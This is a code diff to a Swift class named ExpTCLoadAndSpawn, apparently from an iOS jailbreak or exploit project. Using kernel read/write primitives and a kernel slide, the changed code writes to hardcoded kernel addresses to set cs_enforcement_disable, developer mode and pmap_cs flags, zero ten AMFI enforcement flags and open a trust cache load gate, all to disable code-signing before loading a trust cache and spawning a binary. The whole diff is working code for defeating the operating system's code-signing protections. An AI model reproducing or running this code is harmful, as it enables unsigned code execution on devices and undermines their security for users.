@@ -42,23 +42,40 @@ final class ExpTCLoadAndSpawn {
         log("══ Phase 1: Load Trust Cache ══")
         log("")
         
-        // CRITICAL: Set cs_enforcement_disable = 1 FIRST
-        // Without this, IOServiceOpen to AMFI fails with 0xe00002c2
-        // This was proven on device: pmap_cs probe sets this → IOKit works
+        // CRITICAL: Set ALL enforcement flags before IOKit call
+        // The first successful run had amfi_bypass_run() + pmap_cs probe active
+        // We need to replicate ALL those writes
         let slide = ds_get_kernel_slide()
+        
+        // 1. cs_enforcement_disable = 1
         let csDisableAddr = 0xfffffff00a160798 as UInt64 &+ slide
-        let before = ds_kread32(csDisableAddr)
-        if before != 1 {
-            ds_kwrite32(csDisableAddr, 1)
-            let after = ds_kread32(csDisableAddr)
-            if after == 1 {
-                log("✅ cs_enforcement_disable → 1")
-            } else {
-                log("⚠️ cs_enforcement_disable write failed")
-            }
-        } else {
-            log("✅ cs_enforcement_disable already 1")
+        ds_kwrite32(csDisableAddr, 1)
+        log("cs_enforcement_disable → 1")
+        
+        // 2. developer_mode_init = 1
+        let devModeAddr = 0xfffffff00a0e1368 as UInt64 &+ slide
+        ds_kwrite8(devModeAddr, 1)
+        log("developer_mode_init → 1")
+        
+        // 3. pmap_cs_enforcement = 1 (may fail if KTRR, but try)
+        let pmapEnfAddr = 0xfffffff00a0e45b8 as UInt64 &+ slide
+        ds_kwrite8(pmapEnfAddr, 1)
+        log("pmap_cs_enforcement → 1")
+        
+        // 4. Zero AMFI __DATA enforcement flags (10 flags)
+        let amfiBase: UInt64 = 0xfffffff00a330098 &+ slide
+        let flagOffsets: [UInt64] = [0x110, 0x160, 0x1b0, 0x200, 0x250, 0x2a0, 0x2f0, 0x340, 0x398, 0x408]
+        for off in flagOffsets {
+            ds_kwrite64(amfiBase &+ off, 0)
         }
+        log("AMFI 10 flags zeroed")
+        
+        // 5. trust_cache_load_gate = 1 (may fail if KTRR)
+        let tcGateAddr = 0xfffffff007b795e8 as UInt64 &+ slide
+        ds_kwrite8(tcGateAddr, 1)
+        let tcGateAfter = ds_kread8(tcGateAddr)
+        log("trust_cache_load_gate → \(tcGateAfter)")
+        
         log("")
         
         // Build test binary + trust cache
